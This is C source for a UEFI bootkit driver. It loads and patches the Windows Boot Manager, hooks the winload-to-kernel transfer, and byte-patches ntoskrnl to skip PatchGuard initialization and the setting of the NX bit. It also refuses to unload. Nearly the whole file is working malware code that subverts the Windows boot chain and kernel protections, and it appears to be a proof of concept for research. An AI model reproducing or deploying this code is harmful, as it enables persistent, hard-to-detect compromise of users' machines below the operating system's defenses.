#include "drv.h"

//
// Libraries
//
#include <Library/DevicePathLib.h>
#include <Library/BaseMemoryLib.h>

//
// Protocols
//
#include <Protocol/SimpleFileSystem.h>

//
// Our includes
//
#include "utils.h"
#include "pe.h"
#include "imageldr.h"
#include "hook.h"

//
// We support unload (but deny it)
//
const UINT8 _gDriverUnloadImageCount = 1;

//
// We require at least UEFI 2.0
//
const UINT32 _gUefiDriverRevision = 0x200;
const UINT32 _gDxeRevision = 0x200;

//
// Our name
//
CHAR8 *gEfiCallerBaseName = "UefiDriver";

// Title
#define BOOTKIT_TITLE1		L"\r\n ██████╗ ██╗   ██╗██████╗ ███████╗███████╗ ██╗ █████╗  " \
				L"\r\n ██╔══██╗██║   ██║██╔══██╗██╔════╝╚════██║███║██╔══██╗ " \
				L"\r\n ██║  ██║██║   ██║██║  ██║█████╗      ██╔╝╚██║╚██████║ " 
#define BOOTKIT_TITLE2		L"\r\n ██║  ██║██║   ██║██║  ██║██╔══╝     ██╔╝  ██║ ╚═══██║ " \
				L"\r\n ██████╔╝╚██████╔╝██████╔╝███████╗   ██║   ██║ █████╔╝ " \
				L"\r\n ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝ ╚════╝  "

#define BOOTMGFW_EFI_PATH	L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi"

static EFI_HANDLE gWindowsImagehandle;
static EFI_LOADED_IMAGE* gLocalImageInfo;


// Inside hooks.asm
VOID* FindPattern( VOID* ImageBase, UINT32 ImageSize, const UINT8* Pattern, UINT32 PatternSize );

//
// Get loaded module entry from the LoadOrderList
//
PKLDR_DATA_TABLE_ENTRY GetLoadedModule( LIST_ENTRY* LoadOrderListHead, CHAR16* ModuleName )
{
	if (ModuleName == NULL || LoadOrderListHead == NULL)
		return NULL;

	for (LIST_ENTRY* ListEntry = LoadOrderListHead->ForwardLink; ListEntry != LoadOrderListHead; ListEntry = ListEntry->ForwardLink)
	{
		PKLDR_DATA_TABLE_ENTRY Entry = CONTAINING_RECORD( ListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks );
		if (Entry && (StrnCmp( Entry->BaseImageName.Buffer, ModuleName, Entry->BaseImageName.Length ) == 0))
			return Entry;
	}

	return NULL;
}

//
// OslArchTransferToKernel hook
//
VOID EFIAPI hkOslArchTransferToKernel( PLOADER_PARAMETER_BLOCK KernelParams, VOID *KiSystemStartup )
{
	VOID* KernelBase = NULL;
	UINT32 KernelSize = 0;
	PKLDR_DATA_TABLE_ENTRY KernelEntry = NULL;

	UINT8* Found = NULL;
	EFI_STATUS Status = EFI_SUCCESS;

	__debugbreak( );

	//
	// Before we do anything, restore original call bytes
	//
	*(UINT32*)(OslArchTransferToKernelCallPatchLocation + 1) = *(UINT32*)(OslArchTransferToKernelCallBackup + 1);

	//
	// Get ntoskrnl entry from the loader parameter block's LoadOrderList
	//
	KernelEntry = GetLoadedModule( &KernelParams->LoadOrderListHead, L"ntoskrnl.exe" );
	if (KernelEntry)
	{
		KernelBase = KernelEntry->ImageBase;
		KernelSize = KernelEntry->SizeOfImage;
	}

	if (KernelBase && KernelSize)
	{
		//
		// Find patch guard initialization function
		//
		Status = UtilFindPattern( sigInitPatchGuard, 0xCC, sizeof( sigInitPatchGuard ), KernelBase, KernelSize, (VOID**)&Found );
		if (Status == EFI_SUCCESS)
		{
			InitPatchGuardPatchLocation = (VOID*)Found;

			//
			// Patch to force a jump to skip PG initialization
			//
			*(UINT8*)Found = 0xEB;
		}

		//
		// Find NX bit setting location
		//
		Status = UtilFindPattern( sigNxSetBit, 0xCC, sizeof( sigNxSetBit ), KernelBase, KernelSize, (VOID**)&Found );
		if (Status == EFI_SUCCESS)
		{
			NxSetBitPatchLocation = (VOID*)Found;

			//
			// Patch to force a jump to skip setting the No Execute bit
			//
			*(UINT8*)Found = 0xEB;
		}
	}

	//
	// Pass execution onto the Kernel
	//
	oOslArchTransferToKernel( KernelParams, KiSystemStartup );
}

//
// Our ImgArchEfiStartBootApplication hook which takes the winload Image Base as a parameter so we can patch the kernel
//
EFI_STATUS EFIAPI hkImgArchEfiStartBootApplication( PBL_APPLICATION_ENTRY AppEntry, VOID* ImageBase, UINT32 ImageSize, UINT8 BootOption, PBL_RETURN_ARGUMENTS ReturnArguments )
{
	PIMAGE_NT_HEADERS NtHdr = NULL;

	// Restore original bytes to call
	CopyMem( ImgArchEfiStartBootApplicationPatchLocation, ImgArchEfiStartBootApplicationBackup, 5 );

	// Clear the screen
	gST->ConOut->ClearScreen( gST->ConOut );

	Print( L"Inside ImgArchEfiStartBootApplication\r\n" );
	Print( L"ImageBase = %lx\r\n", ImageBase );
	Print( L"ImageSize = %lx\r\n", ImageSize );
	Print( L"EntryRoutine = %lx\r\n", (VOID*)((UINT8*)ImageBase + HEADER_VAL_T( NtHdr, AddressOfEntryPoint )) );
	Print( L"AppEntry:\r\n" );
	Print( L"  Signature: %a\r\n", AppEntry->Signature );
	Print( L"  Flags: %lx\r\n", AppEntry->Flags );
	Print( L"  GUID: %08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x\r\n", AppEntry->Guid.Data1, AppEntry->Guid.Data2, AppEntry->Guid.Data3, AppEntry->Guid.Data4[0], AppEntry->Guid.Data4[1], AppEntry->Guid.Data4[2], AppEntry->Guid.Data4[3], AppEntry->Guid.Data4[4], AppEntry->Guid.Data4[5], AppEntry->Guid.Data4[6], AppEntry->Guid.Data4[7] );
	Print( L"  Unknown: %lx %lx %lx %lx\r\n", AppEntry->Unknown[0], AppEntry->Unknown[1], AppEntry->Unknown[2], AppEntry->Unknown[3] );
	Print( L"  BcdData:\r\n" );
	Print( L"    Type: %lx\r\n", AppEntry->BcdData.Type );
	Print( L"    DataOffset: %lx\r\n", AppEntry->BcdData.DataOffset );
	Print( L"    DataSize: %lx\r\n", AppEntry->BcdData.DataSize );
	Print( L"    ListOffset: %lx\r\n", AppEntry->BcdData.ListOffset );
	Print( L"    NextEntryOffset: %lx\r\n", AppEntry->BcdData.NextEntryOffset );
	Print( L"    Empty: %lx\r\n", AppEntry->BcdData.Empty );

	NtHdr = ImageNtHeader( ImageBase );
	if (NtHdr != NULL)
	{
		EFI_STATUS EfiStatus = EFI_SUCCESS;
		UINT8* Found = NULL;

		// Find right location to patch
		EfiStatus = UtilFindPattern( sigOslArchTransferToKernelCall, 0xCC, sizeof( sigOslArchTransferToKernelCall ), ImageBase, ImageSize, (VOID**)&Found );
		if (EfiStatus == EFI_SUCCESS)
		{
			Print( L"Found OslArchTransferToKernel call at %lx\r\n", Found );
			
			// Get original from call instruction
			oOslArchTransferToKernel = (tOslArchTransferToKernel)UtilCallAddress( Found );
			Print( L"OslArchTransferToKernel at %lx\r\n", oOslArchTransferToKernel );
			Print( L"OslArchTransferToKernelHook at %lx\r\n", &hkOslArchTransferToKernel );
			
			// Backup original function bytes before patching
			OslArchTransferToKernelCallPatchLocation = (VOID*)Found;
			CopyMem( (VOID*)OslArchTransferToKernelCallBackup, (VOID*)Found, 5 );
			
			// display original code
			Print( L"Original:\r\n" );
			UtilDisassembleCode( (UINT8*)Found, (VOID*)Found, 5 );
			
			// Do patching 
			*(UINT8*)Found = 0xE8;
			*(UINT32*)(Found + 1) = UtilCalcRelativeCallOffset( (VOID*)Found, (VOID*)&hkOslArchTransferToKernel );
			
			// Display patched code 
			Print( L"Patched:\r\n" );
			UtilDisassembleCode( (UINT8*)Found, (VOID*)Found, 5 );
		}
		else
		{
			Print( L"\r\nImgArchEfiStartBootApplication error, failed to find OslArchTransferToKernel patch location. Status: %lx\r\n", EfiStatus );
		}
	}

	UtilPrintLoadedImageInfo( gLocalImageInfo );

	Print( L"Press any key to continue..." );
	UtilWaitForKey( );

	// Clear screen
	gST->ConOut->ClearScreen( gST->ConOut );

	return oImgArchEfiStartBootApplication( AppEntry, ImageBase, ImageSize, BootOption, ReturnArguments );
}

//
// Patch the Windows Boot Manager (bootmgfw.efi)
// 
EFI_STATUS PatchWindowsBootManager( IN VOID* LocalImageBase, IN EFI_HANDLE BootMgrHandle )
{
	EFI_STATUS EfiStatus = EFI_SUCCESS;
	EFI_LOADED_IMAGE *BootMgrImage = NULL;
	UINT8* Found = NULL;

	// Get Windows Boot Manager memory mapping data
	EfiStatus = gBS->HandleProtocol( BootMgrHandle, &gEfiLoadedImageProtocolGuid, (void **)&BootMgrImage );
	if (EFI_ERROR( EfiStatus ))
	{
		ErrorPrint( L"\r\nPatchWindowsBootManager error, failed to get Loaded Image info. Status: %lx\r\n", EfiStatus );
		return EfiStatus;
	}

	// Print Windows Boot Manager image info
	UtilPrintLoadedImageInfo( BootMgrImage );

	// Find right location to patch
	EfiStatus = UtilFindPattern( 
		sigImgArchEfiStartBootApplicationCall,
		0xCC, 
		sizeof( sigImgArchEfiStartBootApplicationCall ),
		BootMgrImage->ImageBase, 
		(UINT32)BootMgrImage->ImageSize, 
		(VOID**)&Found
	);
	if (!EFI_ERROR( EfiStatus ))
	{
		// Found address, now let's do our patching
		UINT32 NewCallRelative = 0;

		Print( L"Found ImgArchEfiStartBootApplication call at %lx\n", Found );

		// Save original call
		oImgArchEfiStartBootApplication = (tImgArchEfiStartBootApplication)UtilCallAddress( Found );
		// Backup original bytes and patch location before patching
		ImgArchEfiStartBootApplicationPatchLocation = (VOID*)Found;
		CopyMem( ImgArchEfiStartBootApplicationBackup, ImgArchEfiStartBootApplicationPatchLocation, 5 );
		// Patch call to jump to our hkImgArchEfiStartBootApplication hook
		NewCallRelative = UtilCalcRelativeCallOffset( (VOID*)Found, (VOID*)&hkImgArchEfiStartBootApplication );
		//Found
		*(UINT8*)Found = 0xE8; // Write call opcode
		*(UINT32*)(Found + 1) = NewCallRelative; // Write the new relative call offset
	}
	else
	{
		ErrorPrint( L"\r\nPatchWindowsBootManager error, failed to find Archpx64TransferTo64BitApplicationAsm patch location. Status: %lx\r\n", EfiStatus );
	}

	return EfiStatus;
}

// 
// Main entry point
// 
EFI_STATUS EFIAPI UefiMain( IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable )
{
	EFI_STATUS efiStatus;
	EFI_DEVICE_PATH* WinBootMgrDevicePath;

	//
	// Clear screen and make pretty
	//
	gST->ConOut->ClearScreen( gST->ConOut );
	gST->ConOut->SetAttribute( gST->ConOut, EFI_GREEN | EFI_BACKGROUND_LIGHTGRAY );

	//
	// Install required driver binding components
	//
	efiStatus = EfiLibInstallDriverBindingComponentName2( ImageHandle, SystemTable, &gDriverBindingProtocol, ImageHandle, &gComponentNameProtocol, &gComponentName2Protocol );
	if (EFI_ERROR( efiStatus ))
		goto Exit;

	//
	// Print stuff out
	//
	Print( L"\r\n\r\n" );
	Print( L"%s", BOOTKIT_TITLE1 );
	Print( L"%s", BOOTKIT_TITLE2 );
	efiStatus = gBS->HandleProtocol( ImageHandle, &gEfiLoadedImageProtocolGuid, &gLocalImageInfo );
	if (EFI_ERROR( efiStatus ))
		goto Exit;
	UtilPrintLoadedImageInfo( gLocalImageInfo );

	//
	// Locate 
	//
	Print( L"Locating Windows UEFI Boot Manager... " );
	efiStatus = UtilLocateFile( BOOTMGFW_EFI_PATH, &WinBootMgrDevicePath );
	if (EFI_ERROR( efiStatus ))
		goto Exit;
	Print( L"Found!\r\n" );
	
	Print( L"Patching Windows Boot Manager... " );
	efiStatus = ImageLoad( ImageHandle, WinBootMgrDevicePath, &gWindowsImagehandle );
	if (EFI_ERROR( efiStatus ))
		goto Exit;
	efiStatus = PatchWindowsBootManager( gLocalImageInfo->ImageBase, gWindowsImagehandle );
	if (EFI_ERROR( efiStatus ))
		goto Exit;
	Print( L"Patched!\r\n" );

	Print( L"\r\nPress any key to load Windows...\r\n" );
	UtilWaitForKey( );

	efiStatus = ImageStart( gWindowsImagehandle );
	if (EFI_ERROR( efiStatus ))
		goto Exit;

Exit:
	if (efiStatus != EFI_SUCCESS)
	{
		ErrorPrint( L"\r\nUEFI Runtime Driver failed with status: %lx\r\n", efiStatus );
	}

	return efiStatus;
}


// 
// Unload the driver
// 
EFI_STATUS EFIAPI UefiUnload( IN EFI_HANDLE ImageHandle )
{
	// Disable unloading
	return EFI_ACCESS_DENIED;
}
